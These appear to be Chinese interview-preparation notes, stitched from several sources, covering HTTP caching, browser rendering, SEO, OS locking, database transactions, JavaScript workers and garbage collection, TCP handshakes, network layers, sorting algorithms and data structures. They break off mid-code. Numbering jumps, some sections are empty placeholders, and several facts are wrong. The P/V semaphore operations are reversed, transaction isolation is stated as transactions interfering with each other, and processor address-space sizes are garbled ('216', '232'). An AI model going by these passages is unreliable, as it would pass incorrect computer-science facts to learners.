请求网址（url）：http://www.dydh.org/ cookie可以用来保存一些有用的信息：Cookies如果是首次访问，会提示服务器建立用户缓存信息，如果不是，可以利用Cookies对应键值，找到相应缓存，缓存里面存放着用户名，密码和一些用户设置项。
。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。

进入到一个大主机上，该主机上有一个apache web server，他的端口号为80
通过这个80端口号标识，由apache web server处理这个请求。
apache打开myblog/test.php文件，apache认识html语法，
但不认识php语法，apache就加载php模块，解析php这段代码，
并将得到的结果放在原php位置。然后apache将处理完的结果，
当成一个大字符串返回给客户端浏览器，浏览器将html语法解释执行，


5.浏览器渲染页面

客户端拿到服务器端传输来的文件，找到HTML和MIME文件，通过MIME文件，浏览器知道要用页面渲染引擎来处理HTML文件。

ａ.浏览器会解析html源码，然后创建一个 DOM树。

在DOM树中，每一个HTML标签都有一个对应的节点，并且每一个文本也都会有一个对应的文本节点。

b.浏览器解析CSS代码，计算出最终的样式数据，形成css对象模型CSSOM。

首先会忽略非法的CSS代码，之后按照浏览器默认设置——用户设置——外链样式——内联样式——HTML中的style样式顺序进行渲染。

c.利用DOM和CSSOM构建一个渲染树（rendering tree）。
渲染树和DOM树有点像，但是是有区别的。

DOM树完全和html标签一一对应，但是渲染树会忽略掉不需要渲染的元素，比如head、display:none的元素等。

而且一大段文本中的每一个行在渲染树中都是独立的一个节点。
渲染树中的每一个节点都存储有对应的css属性。

ｄ.浏览器就根据渲染树直接把页面绘制到屏幕上。



如何发送请求 tcp 浏览器渲染
闭包，创建对象的方式，参数指向，
移动端问题
vue react Native
11.做好搜索引擎优化需要考虑什么
1、了解搜索引擎如何抓取网页（如何抓取：关键词的提取）和如何索引网页你需要知道一些搜索引擎的基本工作原理，各个搜索引擎之间的区别，搜索机器人（SE robot 或叫 web crawler）如何进行工作，搜索引擎如何对搜索结果进行排序等等。
2、Meta标签优化
主要包括主题（Title)，网站描述(Description)，和关键词（Keywords）。还有一些其它的隐藏文字比如Author（作者），Category（目录），Language（编码语种）等。
3、如何选取关键词并在网页中放置关键词
搜索就得用关键词。关键词分析和选择是SEO最重要的工作之一。首先要给网站确定主关键词（一般在5个上下），然后针对这些关键词进行优化，包括关键词密度（Density），相关度（Relavancy），突出性（Prominency）等等。
4、了解主要的搜索引擎
虽然搜索引擎有很多，但是对网站流量起决定作用的就那么几个。比如英文的主要有Google，Yahoo，Bing等；中文的有百度，搜狗，有道等。
不同的搜索引擎对页面的抓取和索引、排序的规则都不一样。还要了解各搜索门户和搜索引擎之间的关系，比如AOL网页搜索用的是Google的搜索技术，MSN用的是Bing的技术。
5、主要的互联网目录
Open Directory自身不是搜索引擎，而是一个大型的网站目录，他和搜索引擎的主要区别是网站内容的收集方式不同。目录是人工编辑的，主要收录网站主页；搜索引擎是自动收集的，除了主页外还抓取大量的内容页面。
6、按点击付费的搜索引擎
搜索引擎也需要生存，随着互联网商务的越来越成熟，收费的搜索引擎也开始大行其道。最典型的有Overture和百度，当然也包括Google的广告项目Google Adwords。越来越多的人通过搜索引擎的点击广告来定位商业网站，这里面也大有优化和排名的学问，你得学会用最少的广告投入获得最多的点击。
7、搜索引擎登录
网站做完了以后，别躺在那里等着客人从天而降。要让别人找到你，最简单的办法就是将网站提交（submit）到搜索引擎。如果你的是商业网站，主要的搜索引擎和目录都会要求你付费来获得收录（比如Yahoo要299美元），但是好消息是（至少到目前为止）最大的搜索引擎Google目前还是免费，而且它主宰着60％以上的搜索市场。
8、链接交换和链接广泛度（Link Popularity）
网页内容都是以超文本（Hypertext）的方式来互相链接的，网站之间也是如此。除了搜索引擎以外，人们也每天通过不同网站之间的链接来Surfing（“冲浪”）。其它网站到你的网站的链接越多，你也就会获得更多的访问量。更重要的是，你的网站的外部链接数越多，会被搜索引擎认为它的重要性越大，从而给你更高的排名。
9、标签的合理使用
12.基础课篇
1.http有没有设置缓存？
	http中具有缓存功能的是浏览器缓存，以及缓存代理服务器。
	1.浏览器缓存是把页面信息保存到用户本地硬盘里，页面缓存状态是由http header决定的
	2.代理服务器缓存的是指:当Web请求抵达缓存时， 如果本地有“已缓存的”副本，就可以从本地存储设备而不是从原始服务器中提取这个文档。

3.如何处理资源竞争（进程同时访问一个资源）
	1临界区（加锁）:通过对多线程的串行化来访问公共资源或一段代码，速度快，适合控制数据访问。
	2互斥量（加锁）:为协调共同对一个共享资源的单独访问而设计的。（0，1）
	3信号量（P/V操作）:为控制一个具有有限数量用户资源而设计。p（s1）v（s1）p使s1加，v使s1减
	4事 件:用来通知线程有一些事件已发生，从而启动后继任务的开始。

临界资源：指某段时间只能允许一个进程使用资源。
临界区（代码），专门访问临界资源的

4.函数调用和系统调用的区别？
	一般函数调用即函数库调用是语言或应用程序的一部分，
	而系统调用是操作系统的一部分。你要确保弄懂“trap（自陷）”这个关键字的含义。系统调用是在操作系统内核发现一个“trap”或中断后进行的。

5.操作统中锁的实现原理
	在多线程编程中，为了保证数据操作的一致性，操作系统引入了锁机制，用于保证临界区代码的安全。通过锁机制，在某一个时间点上，只能有一个线程进入临界区代码，从而保证临界区中操作数据的一致性。
	内存中的一个变量，拥有两种状态：空闲状态和上锁状态。加锁时，判断锁是否空闲，如果空闲，修改为上锁状态，返回成功；如果已经上锁，则返回失败。解锁时，则把锁状态修改为空闲状态。

6.保证完整性：事务
	事务的四个特性：
	1.原子性：要么全部都成功，要么全都不成功。2.一致性：数据必须处于一致的状态。3.隔离性：多个事务同时进行，它们之间互相干扰。4.持久性：提交后不能更改。

7.数据并发的问题
	丢失修改
	读“脏”数据
	不可重复读

8.基本封锁类型
	排它锁（Exclusive Locks，简记为X锁，写锁）
		若事务T对数据对象A加上X锁，则只允许T读取和修改A，其它任何事务都不能再对A加任何类型的锁，直到T释放A上的锁
		保证其他事务在T释放A上的锁之前不能再读取和修改A
	共享锁（Share Locks，简记为S锁，读锁）
		若事务T对数据对象A加上S锁，则其它事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁
		保证其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改

9.三级封锁协议解决数据并发的问题
	一级封锁协议：事务T在修改数据R之前必须先对其加X锁，直到事务结束才释放。
	二级封锁协议：一级封锁协议+事务T在读取数据R前必须先加S锁，读完后即可释放S锁。
	三级封锁协议：一级封锁协议加上事务T在读取数据R之前必须先对其加S锁，直到事务结束才释放。

10.可串行化
	可串行化调度是指多个事务的并发执行是正确的，当且仅当其结果与按某一次序串行地执行这些事务时的结果相同
	可串行性1.是并发事务正确调度的准则2.一个给定的并发调度，当且仅当它是可串行化的，才认为是正确调度

11.内存回收（Java 垃圾回收机制）
	Java垃圾回收主要做的是两件事：1）内存回收 2）碎片整理
	如果一个对象，没有一个引用指向它，那么它就被认为是一个垃圾。
12.java弱类型
	弱引用简单来说就是将对象留在内存的能力不是那么强的引用；垃圾回收器会帮你来决定引用的对象合适回收并且将对象从内存移除；解决强引用带来的内存泄漏的问题。

13.强引用带来的问题
	1.内存泄漏2.缓存




51\js多线程
	webworkers （ie不支持） 实现多线程  异步的执行JS 避免阻塞IO
	浏览器中的JS是单线程的。
	解决客户端JavaScript无法多线程的问题，其定义的worker是指代码的并行线程，不过webworker处于一个自包含的环境中，无法访问主线程的window对象和document对象，和主线程通信只能通过异步消息传递机制

  具体操作
	我们需要把希望单独执行的javascript代码放到一个单独的js文件中，然后在页面中调用Worker构造函数来创建一个线程，参数是该文件路径，参数存放如果是相对地址，那么要以包含调用Worker构造函数语句所在脚本为参照，如果是绝对路径，需要保证同源（协议+主机+端口）


	我们可以看到worker对象只有两个属性，其实是两个回调函数句柄
	onerror:当worker运行出现错误，并且没有在worker中ing捕获，会在此捕获
	onmessage:当worker向主线程发送消息是调用

	在其prototype内有两个重要方法
	postMessage:很熟悉的赶脚，之前我们介绍过window对象的postMessage()方法，woker的postMessage方法和window的比较类似，但参数略有不同，只需要传递消息内容就可以，而且支持所有JavaScript原生数据类型，当然不放心的话同样也可以序列化为字符串传递
	terminate:终止worker执行，有些worker执行比较慢，主线程可以主动终止其执行



57\js垃圾回收:
	目前JS的垃圾回收机制无非就是两种：1.标记清除（make-and-sweep） 2.引用计数（reference counting）
	1.标记清除：标记清除简单的来说就是给各个变量名打上 YES or NO的标签以供JS引擎进行处理（当然打什么标签自己理解即可）。在和执行上下文类似的的环境中当变量名称进入环境的时候，那么变量会被打上 YES。一般来说是绝对不会释放被打上 YES 标签的变量内存的，一旦变量在出了该环境时，变会被打上 NO 标签（和作用域貌似有点像），JS引擎会在一定时间间隔或者设置的时间来进行扫描，对NO标签的进行剔除以释放其内存。
	2.引用计数（查了很多资料，还是无法找到其真正的计算方式）
	一般来说，引用计数的含义是跟踪记录每个值被引用的次数。当声明一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数便是1，如果同一个值又被赋给另一个变量，则该值的引用次数加1，相反，如果包含对这个值引用的变量又取得了另一个值，则这个值的引用次数减1。当这个值的引用次数为0时，说明没有办法访问到它了，因而可以将其占用的内存空间回收。


13\Websocket：基于TCP/IP协议的，双向的、全双工的数据连接
           双向的：客户端、服务器端
           全双工：数据的发送与接收，两者同步进行

	<首先Websocket是ws协议,但是是基于HTTP协议的，借用了HTTP的协议来完成一部分握手。这段类似HTTP协议的握手请求中，多了几个东西。
	这个就是Websocket的核心了，告诉 Apache 、 Nginx 等服务器：注意啦，我发起的是Websocket协议，快点帮我找到对应的助理处理~不是那个老土的HTTP。

	至此，HTTP已经完成它所有工作了，接下来就是完全按照Websocket协议进行了。

	但是Websocket只需要一次HTTP握手，所以说整个通讯过程是建立在一次连接/状态中，也就避免了HTTP的非状态性，服务端会一直知道你的信息，直到你关闭请求，这样就解决了接线员要反复解析HTTP协议，还要查看identity info的信息。

	服务端就可以主动推送信息给客户端啦!>

	在传统的方式上，要不断的建立，关闭HTTP协议，由于HTTP是非状态性的，每次都要重新传输 identity info （鉴别信息），来告诉服务端你是谁。



	long poll：
	 客户端发起连接后，如果没消息，就一直不返回Response给客户端。直到有消息才返回，返回完之后，客户端再次建立连接，周而复始。

	其实原理跟 ajax轮询 差不多，都是采用轮询的方式，不过采取的是阻塞模型（一直打电话，没收到就不挂电话）
	ajax轮询 需要服务器有很快的处理速度和资源。（速度）long poll 需要有很高的并发

	哦对了，忘记说了HTTP还是一个状态协议。
	通俗的说就是，服务器因为每天要接待太多客户了，是个健忘鬼，你一挂电话，他就把你的东西全忘光了，把你的东西全丢掉了。你第二次还得再告诉服务器一遍。



进程与线程

    进程，《是并发执行的程序在执行过程中分配和管理资源的基本单位，是一个动态概念，竟争计算机系统资源的基本单位。》
    	每一个进程都有一个自己的地址空间，即进程空间或（虚空间）。进程空间的大小 只与处理机的位数有关，一个 16 位长处理机的进程空间大小为 216 ，而 32 位处理机的进程空间大小为 232 。
    	进程至少有 5 种基本状态，它们是：初始态，执行态，等待状态，就绪状态，终止状态。

    线程，在网络或多用户环境下，一个服务器通常需要接收大量且不确定数量用户的并发请求，为每一个请求都创建一个进程显然是行不通的，——无论是从系统资源开销方面或是响应用户请求的效率方面来看。因此，操作系统中线程的概念便被引进了。
    《线程，是进程的一部分，一个没有线程的进程可以被看作是单线程的。线程有时又被称为轻权进程或轻量级进程，也是 CPU 调度的一个基本单位。》

  区别：

   《进程的执行过程是线状的，尽管中间会发生中断或暂停，但该进程所拥有的资源只为该线状执行过程服务。一旦发生进程上下文切换，这些资源都是要被保护起来的。》这是进程宏观上的执行过程。而进程又可有单线程进程与多线程进程两种。我们知道，进程有 一个进程控制块 PCB ，相关程序段 和 该程序段对其进行操作的数据结构集 这三部分，单线程进程的执行过程在宏观上是线性的，微观上也只有单一的执行过程；而多线程进程在宏观上的执行过程同样为线性的，但微观上却可以有多个执行操作（线程），如不同代码片段以及相关的数据结构集。

    《线程的改变只代表了 CPU 执行过程的改变，而没有发生进程所拥有的资源变化。除了CPU之外，计算机内的软硬件资源的分配与线程无关，线程只能共享它所属进程的资源。》与进程控制表和 PCB 相似，每个线程也有自己的线程控制表 TCB ，而这个 TCB 中所保存的线程状态信息则要比 PCB 表少得多，这些信息主要是相关指针用堆栈（系统栈和用户栈），寄存器中的状态数据。

    《进程拥有一个完整的虚拟地址空间，不依赖于线程而独立存在；》
    《反之，线程是进程的一部分，没有自己的地址空间，与进程内的其他线程一起共享分配给该进程的所有资源。！！！！！》

    线程可以有效地提高系统的执行效率，但并不是在所有计算机系统中都是适用的，如某些很少做进程调度和切换的实时系统。使用线程的好处是有多个任务需要处理机处理时，减少处理机的切换时间；而且，线程的创建和结束所需要的系统开销也比进程的创建和结束要小得多。最适用使用线程的系统是多处理机系统和网络系统或分布式系统。

----------------------------------

1. 线程的执行特性。

    线程只有 3 个基本状态：就绪，执行，阻塞。

    线程存在 5 种基本操作来切换线程的状态：派生，阻塞，激活，调度，结束。

2. 进程通信。

    单机系统中进程通信有 4 种形式：主从式，会话式，消息或邮箱机制，共享存储区方式。

        主从式典型例子：终端控制进程和终端进程。

        会话式典型例子：用户进程与磁盘管理进程之间的通信。



算法题

 排序:
	1、  直接插入排序：
		①   思想：最基本的插入排序，将第i个插入到前i-1个中的适当位置。
		②   时间复杂度：T(n) = O(n²)。
		③   空间复杂度：S(n) = O(1)。
	2、折半插入排序：
		①   思想：因为是已经确定了前部分是有序序列，所以在查找插入位置的时候可以用折半查找的方法进行查找，提高效率。
		②   时间复杂度：比较时的时间减为O(n㏒n)，但是移动元素的时间耗费未变，所以总是得时间复杂度还是O(n²)。
		③   空间复杂度：S(n) = O(1)。
		④   稳定性：稳定排序。

	3、  希尔排序：
		①   思想：又称缩小增量排序法。把待排序序列分成若干较小的子序列，然后逐个使用直接插入排序法排序，最后再对一个较为有序的序列进行一次排序，主要是为了减少移动的次数，提高效率。原理应该就是从无序到渐渐有序，要比直接从无序到有序移动的次数会少一些。
		②   时间复杂度：O(n的1.5次方)
		③   空间复杂度：O(1)
		④   稳定性：不稳定排序。{2,4,1,2}，2和1一组4和2一组，进行希尔排序，第一个2和最后一个2会发生位置上的变化。

	1、  冒泡排序：
		①   思想：反复扫描待排序序列，在扫描的过程中顺次比较相邻的两个元素的大小，若逆序就交换位置。第一趟，从第一个数据开始，比较相邻的两个数据，（以升序为例）如果大就交换，得到一个最大数据在末尾；然后进行第二趟，只扫描前n-1个元素，得到次大的放在倒数第二位。以此类推，最后得到升序序列。如果在扫描过程中，发现没有交换，说明已经排好序列，直接终止扫描。所以最多进行n-1趟扫描。
		②   时间复杂度：T(n) = O(n²)。
		③   空间复杂度：S(n) = O(1)。
		④   稳定性：稳定排序。。

	2、  快速排序：
		①   思想：冒泡排序一次只能消除一个逆序，为了能一次消除多个逆序，采用快速排序。以一个关键字为轴，从左从右依次与其进行对比，然后交换，第一趟结束后，可以把序列分为两个子序列，然后再分段进行快速排序，达到高效。
		②   时间复杂度：平均T(n) = O(n㏒n)，最坏O(n²)。
		③   空间复杂度：S(n) = O(㏒n)。
		④   稳定性：不稳定排序。{3， 2， 2}

	1、简单选择排序：
		①   思想：第一趟时，从第一个记录开始，通过n – 1次关键字的比较，从n个记录中选出关键字最小的记录，并和第一个记录进行交换。第二趟从第二个记录开始，选择最小的和第二个记录交换。以此类推，直至全部排序完毕。
		②   时间复杂度：T(n) = O(n²)。
		③   空间复杂度：S(n) = O(1)。
		④   稳定性：不稳定排序，{3， 3， 2}。

	2、树形选择排序：
		①   思想：为了减少比较次数，两两进行比较，得出的较小的值再两两比较，直至得出最小的输出，然后在原来位置上置为∞，再进行比较。直至所有都输出。
		②   时间复杂度：T(n) = O(n㏒n)。
		③   空间复杂度：较简单选择排序，增加了n-1个额外的存储空间存放中间比较结果，就是树形结构的所有根节点。S(n) = O(n)。
		④   稳定性：稳定排序。

	3、  堆排序：
		①   思想：把待排序记录的关键字存放在数组r[1…n]中，将r看成是一刻完全二叉树的顺序表示，每个节点表示一个记录，第一个记录r[1]作为二叉树的根，一下个记录r[2…n]依次逐层从左到右顺序排列，任意节点r[i]的左孩子是r[2i]，右孩子是r[2i+1]，双亲是r[i/2向下取整]。然后对这棵完全二叉树进行调整建堆。
		②   时间复杂度：T(n) = O(n㏒n)。
		③   空间复杂度：S(n) = O(1)。
		④   稳定性：不稳定排序。

	4、归并排序：
		①   思想：假设初始序列右n个记录，首先将这n个记录看成n个有序的子序列，每个子序列的长度为1，然后两两归并，得到n/2向上取整 个长度为2（n为奇数时，最后一个序列的长度为1）的有序子序列。在此基础上，在对长度为2的有序子序列进行两两归并，得到若干个长度为4的有序子序列。如此重复，直至得到一个长度为n的有序序列为止。
		②   时间复杂度：T(n) = O(n㏒n)。
		③   空间复杂度：S(n) = O(n)。
		④   稳定性：稳定排序。

	总结：
	（1）简单排序法一般只用于n较小的情况（例如n<30）。当序列的记录“基本有序”时，直接插入排序是最佳的排序方法。如果记录中的数据较多，则应采用移动次数较少的简单选择排序法。

	（2）快速排序、堆排序和归并排序的平均时间复杂度均为O(n㏒n)，但实验结果表明，就平均时间性能而言，快速排序是所有排序方法中最好的。遗憾的是，快速排序在最坏情况下的时间性能为O(n²)。堆排序和归并排序的最坏时间复杂度仍为O(n㏒n)，当n较大时，归并排序的时间性能优于堆排序，但它所需的辅助空间最多。

	（3）从排序的稳定性上来看，在所有简单排序法中，简单选择排序是不稳定的，其他各种简单排序法都是稳定的。然而，在那些时间性能较好的排序方法中，希尔排序、快速排序、堆排序都是不稳定的，只有归并排序、基数排序是稳定的。




不借助临时变量，进行两个整数的交换
	主要是利用 + – 去进行运算，类似 a = a + ( b – a) 实际上等同于最后 的 a = b;
	 	b = b - a;
	  	a = a + b;
	 	b = a - b;


实现类似getElementsByClassName 的功能
	自己实现一个函数，查找某个DOM节点下面的包含某个class的所有DOM节点？不允许使用原生提供的 getElementsByClassName querySelectorAll 等原生提供DOM查找函数。

	JavaScript

	function queryClassName(node, name) {
	  var starts = '(^|[ \n\r\t\f])',
	       ends = '([ \n\r\t\f]|$)';
	  var array = [],
	        regex = new RegExp(starts + name + ends),
	        elements = node.getElementsByTagName("*"),
	        length = elements.length,
	        i = 0,
	        element;

	    while (i < length) {
	        element = elements[i];
	        if (regex.test(element.className)) {
	            array.push(element);
	        }

	        i += 1;
	    }

	    return array;
	}

深度优先遍历:也就深入的遍历，沿着每一个分支直到走到最后，然后才返回来遍历剩余的节点
广度优先遍历:也就是按层次的去遍历。依次遍历根节点，然后是左孩子和右孩子。所以要遍历完当前节点的所有孩子，这样才是层次遍历嘛。




前端页面性能问题??????

	node异步回调

实现一个单例模式，???????



如何解决高并发问题?
	1\数据库
	2\HTML静态化:效率最高、消耗最小的就是纯静态化 页面
		网站HTML静态化解决方案
		当一个Servlet资源请求到达WEB服务器之后我们会填充指定的JSP页面来响应请求:
		HTTP请求---Web服务器---Servlet--业务逻辑处理--访问数据--填充JSP--响应请求
		HTML静态化之后:
		HTTP请求---Web服务器---Servlet--HTML--响应请求
	3\缓存、负载均衡、存储
	4\图片服务器分离:图片是最消耗资源的，于是我们有必要将图片与页面进行分离





计算机网络：：
五层协议:
	一、实体层:它就是把电脑连接起来的物理手段。它主要规定了网络的一些电气特性，作用是负责传送0和1的电信号
	二、链接层:这就是"链接层"的功能，它在"实体层"的上方，确定了0和1的分组方式。
			以太网协议:一组电信号构成一个数据包，叫做"帧"（Frame）。每一帧分成两个部分：标头（Head）和数据（Data）
			MAC地址:以太网规定，连入网络的所有设备，都必须具有"网卡"接口。数据包必须是从一块网卡，传送到另一块网卡。网卡的地址，就是数据包的发送地址和接收地址，这叫做MAC地址

			广播:1号计算机向2号计算机发送一个数据包，同一个子网络的3号、4号、5号计算机都会收到这个包。它们读取这个包的"标头"
				，找到接收方的MAC地址，然后与自身的MAC地址相比较，如果两者相同，就接受这个包，做进一步处理，否则就丢弃这个包。这种发送方式就叫做"广播"
			  一块网卡怎么会知道另一块网卡的MAC地址？回答是有一种ARP协议;
				就算有了MAC地址，系统怎样才能把数据包准确送到接收方？
				回答是以太网采用了一种很"原始"的方式，它不是把数据包准确送到接收方，而是向本网络内所有计算机发送，让每台计算机自己判断，是否为接收方。

	三、网络层:这就导致了"网络层"的诞生。它的作用是引进一套新的地址，使得我们能够区分不同的计算机是否属于同一个子网络。这			套地址就叫做"网络地址"，简称"网址"。
		IP协议:规定网络地址的协议，叫做IP协议。它所定义的地址，就被称为IP地址。
		IP数据包:根据IP协议发送的数据，就叫做IP数据包。不难想象，其中必定包括IP地址信息
		ARP协议:总之，有了ARP协议之后，我们就可以得到同一个子网络内的主机MAC地址，可以把数据包发送到任意一台主机之上了。

	四、传输层:有了MAC地址和IP地址，我们已经可以在互联网上任意两台主机上建立通信。
		"传输层"的功能，就是建立"端口到端口"的通信。相比之下，"网络层"的功能是建立"主机到主机"的通信。只要确定主机和端口，我们就能实现程序之间的交流。


		 UDP协议:现在，我们必须在数据包中加入端口信息，这就需要新的协议。最简单的实现叫做UDP协议，它的格式几乎就是在数据前面，加上端口号。
  		UDP/ TCP区别:
  			UDP不安全,TCP安全
  		  UDP协议的优点是比较简单，容易实现，但是缺点是可靠性较差，一旦数据包发出，无法知道对方是否收到。
		  为了解决这个问题，提高网络可靠性，TCP协议就诞生了。这个协议非常复杂，但可以近似认为，它就是有确认机制的UDP协议，每发出一个数据包都要求确认。如果有一个数据包遗失，就收不到确认，发出方就知道有必要重发这个数据包了。
		  因此，TCP协议能够确保数据不会遗失。它的缺点是过程复杂、实现困难、消耗较多的资源。

	五、应用层:就是规定应用程序的数据格式。



10\在浏览器地址栏里输入一个地址，按回车发生了什么？
	1. 浏览器会发送一个get请求，该请求会被转发到DNS服务器，由DNS服务器解析域名，然后再转发到相应的IP地址对应的服务器。
	2. 在服务器端由Apache这样的Web Server来接收请求，并进行相应的处理，然后响应结果给客户端浏览器。
	3. 浏览器接收响应的结果，并进行相应的语法检查，如果有错误，可能会提示错误，如果没有错误，就进行渲染。
	4. 渲染的时候先生成DOM树，然后根据CSS和JS规则生成渲染树（渲染树中的结构往往比DOM树要少，因为有些DOM树中有些元素如果隐藏的话，不会出现在渲染树中），最后再渲染出来


27\浏览器是怎么把html文档解析成DOM结构的
 	渲染引擎会解析ＨＴＭＬ文档并把标签转换成内容树中的ＤＯＭ节点。它会解析style元素和外部文件中的样式数据。样式数据和ＨＴＭＬ中的显示控制将共同用来创建另一棵树——渲染树。然后再布局，webkit叫渲染树/Geko叫帧树

11\TCP三次握手：建立连接
	 (1)Client端向Server端发送一个SYN包，请求建立连接。
	 (2)Server端收到SYN包后，会发送一个SYN/ACK确认包回去，表示对第一个SYN包的确认。
	 (3)Client端收到SYN/ACK包后，会发送一个ACK确认包，通知Server连接已建立。

11.1\TCP建立连接为什么需要三次握手，两次不行吗？
答：在谢希仁著《计算机网络》第四版中讲“三次握手”的目的是“为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误”。

12\TCP四次挥手：关闭连接
	(1) Client端向Server端FIN报文，请求关闭连接
	(2) Server端发送ACK，表示收到请求。但是Server端还有数据没有发送完成，则不必着急关闭Socket，可以继续发送数据。这时Client端进入FIN_WAIT状态，等待Server端的FIN报文。
	(3)当Server端确定数据已发送完成，则向Client端发送FIN报文，表明可以关闭连接了
	(4)Client端收到FIN报文后，知道可以关闭连接了，再发送ACK，后进入TIME_WAIT状态，Client端等待了2MSL(最大报文生存时间)后依然没有收到回复，则证明Server端已正常关闭，然后Client端也可以关闭连接了，进入Closed状态。
	Server端收到ACK后，就关闭连接了。如果Server端没有收到ACK，那么将重发FIN。


13\http/https:
	HTTP协议传输的数据都是未加密的，也就是明文的，因此使用HTTP协议传输隐私信息非常不安全，为了保证这些隐私数据能加密传输，于是网景公司设计了SSL（Secure Sockets Layer）协议用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS。
	为了数据传输的安全，HTTPS在HTTP的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。
	简单来说，HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。

14\HTTPS和HTTP的区别主要如下：
	1、https协议需要到ca申请证书，一般免费证书较少，因而需要一定费用。
	2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。
	3、http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。
	4、http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。

15\http缓存：HTTP缓存，明确的要知道GET请求可以被缓存，POST不能被缓存，所以要想在客户端做HTTP的缓存一定要注意使用GET请求！
  两种方式:
	If-Modified-Since/Last-Modified
	If-Modified-Since这个是在Request里面的Cache中的信息用来表示本地缓存最后一次被修改的时间，他被发送到服务器并且和Response的Entity中Last-Modified作比较，如果两者的日期一致，那就说明在此期间页面没有任何改动浏览器可以使用本地缓存。（所提到的头域都可以在上面图中找到，大家结合图来看比较清晰）

	If-None-Match/Etag
	If-None-Match是在Request中请求头的第一行，他存储一个字符串（资源在服务器的唯一确定标志）。Etag是Response中Entity中的一个字符串。两个也是做比较，相同说明可以使用缓存。

http协商缓存中：Etag/lastModified完整过程（可以配合上面的HTTP流程理解）：
1.	客户端请求一个页面（A）。2.服务器返回页面A，并在给A加上一个Last-Modified/ETag。3.客户端展现该页面，并将页面连同Last-Modified/ETag一起缓存.4.客户再次请求页面A，并将上次请求时服务器返回的Last-Modified/ETag一起传递给服务器。5.服务器检查该Last-Modified或ETag，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应304和一个空的响应体。
15.数据结构篇
0.常见数据结构
一、栈：

1、后缀表达式的求值；
2、中缀到后缀表达式的转换；
3、深度优先搜索的非递归实现；
4、动态规划的优化：用于维护一个凸序列，便于二分查找，如LIS问题的O(nlgn)算法。

二、队列：
1、树的层序遍历；
2、广度优先搜索；
3、Bellman-Ford算法的SPFA实现；
4、网络流中FF算法的Edmonds-Karp实现，以及Preflow算法的队列优化实现。


三、二叉搜索树：

1、对大量的关键字的索引查找；
2、有很多平衡策略以改善其平均性能：
常用平衡树：AVL，红黑树，随机化BST，Splay Tree，Treap（或叫笛卡儿树）。

四、散列表（hash表）：
1、一般针对值域较大但状态很稀疏的应用，比如状态压缩记忆化搜索；
2、实现映射功能。

五、检索树（Trie）：
1、一般用于字符串索引算法，速度快，但占用空间较大（相对hash）；
2、常用的改进结构：Patricia线索树，多叉检索树（TST）。

六、优先队列：

1、常用的是二叉堆的实现，具体应用如堆排序和Dijkstra算法；
2、当需要快速合并两个优先队列时，常用二项式队列，实现简单。
3、注意最大最小堆的配对使用。

七、线段树和树状数组：

1、两者都可以用于离散对象的统计；
2、后者的步进函数的性质和应用值得注意；
3、前者基本上适用于任何的区间操作，如求区间最值，改变区间的值等。
4、线段树还可以用于优化状态的枚举，经常和动态规划结合。

八、后缀树与后缀数组：

1、总体规律是两者的实现都比较复杂，前者更甚，但是前者的功能也更强大；
2、几乎可以解决所有常见的关于字符串的算法，如最长回文子串，最长重复子串，以及很多的模式匹配问题。

九、并查集：

1、解决无向图的连通性问题，如用于Kruskal算法；
2、解决等价关系的查询（这是它的主要用武之地），如05年Baidu之星初赛的石头剪子布游戏；
3、优点是实现异常简单，缺点是合并后无法分离，若需要可以选择用动态树。

十、邻接表和边表：

1、表示图的最直接的方法；
2、后者更省空间，并且在一定程度上更好用，比如Bellman-Ford算法。




栈和队列的区别?

栈的插入和删除操作都是在一端进行的，而队列的操作却是在两端进行的。

队列先进先出，栈先进后出。

栈只允许在表尾一端进行插入和删除，而队列只允许在表尾一端进行插入，在表头一端进行删除

栈和堆的区别？

栈区（stack）—   由编译器自动分配释放   ，存放函数的参数值，局部变量的值等。

堆区（heap）   —   一般由程序员分配释放，   若程序员不释放，程序结束时可能由OS回收。

堆（数据结构）：堆可以被看成是一棵树，如：堆排序；

栈（数据结构）：一种先进后出的数据结构。
1.插入排序
插入排序（Insertion Sort）
插入排序的代码实现虽然没有冒泡排序和选择排序那么简单粗暴，但它的原理应该是最容易理解的了，因为只要打过扑克牌的人都应该能够秒懂。当然，如果你说你打扑克牌摸牌的时候从来不按牌的大小整理牌，那估计这辈子你对插入排序的算法都不会产生任何兴趣了…..
(1)算法简介
插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。
(2)算法描述和实现
一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下：
<1>.从第一个元素开始，该元素可以认为已经被排序； <2>.取出下一个元素，在已经排序的元素序列中从后向前扫描； <3>.如果该元素（已排序）大于新元素，将该元素移到下一位置； <4>.重复步骤3，直到找到已排序的元素小于或者等于新元素的位置； <5>.将新元素插入到该位置后； <6>.重复步骤2~5。
Javascript代码实现:
function insertionSort(array) {
    if (Object.prototype.toString.call(array).slice(8, -1) === 'Array') {
        console.time('插入排序耗时：');
        for (var i = 1; i < array.length; i++) {
            var key = array[i];
            var j = i - 1;
            while (j >= 0 && array[j] > key) {
                array[j + 1] = array[j];
                j--;
            }
            array[j + 1] = key;
        }
        console.timeEnd('插入排序耗时：');
        return array;
    } else {
        return 'array is not an Array!';
    }
}
改进插入排序： 查找插入位置时使用二分查找的方式
function binaryInsertionSort(array) {
    if (Object.prototype.toString.call(array).slice(8, -1) === 'Array') {
        console.time('二分插入排序耗时：');

        for (var i = 1; i < array.length; i++) {
            var key = array[i], left = 0, right = i - 1;
            while (left <= right) {
                var middle = parseInt((left + right) / 2);
                if (key < array[middle]) {
                    right = middle - 1;
                } else {
                    left = middle + 1;
                }
            }
            for (var j = i - 1; j >= left; j--) {
                array[j + 1] = array[j];
